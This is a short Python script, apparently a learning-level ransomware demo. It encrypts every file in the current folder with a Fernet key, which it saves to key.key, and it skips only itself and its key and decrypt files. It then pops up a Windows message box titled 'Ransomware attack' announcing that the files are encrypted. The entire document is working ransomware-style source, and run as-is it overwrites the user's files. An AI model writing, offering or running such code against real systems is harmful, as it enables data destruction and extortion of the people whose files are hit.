import os, ctypes
from cryptography.fernet import Fernet

files = [] #array for all files in folder
for file in os.listdir(): # Scan files in current folder
    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key() #generate key and write to keyfile
with open("key.key", "wb") as keyfile:
    keyfile.write(key)

#encrypt every file within "files" array
for file in files:
    with open(file, "rb")as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# test
print(files, "\n", key)

ctypes.windll.user32.MessageBoxW(None, "All your files have been encrypted, \n if you want your files back run the "
                                       "decrypt program, if you dare.", "Ransomware attack", 0)
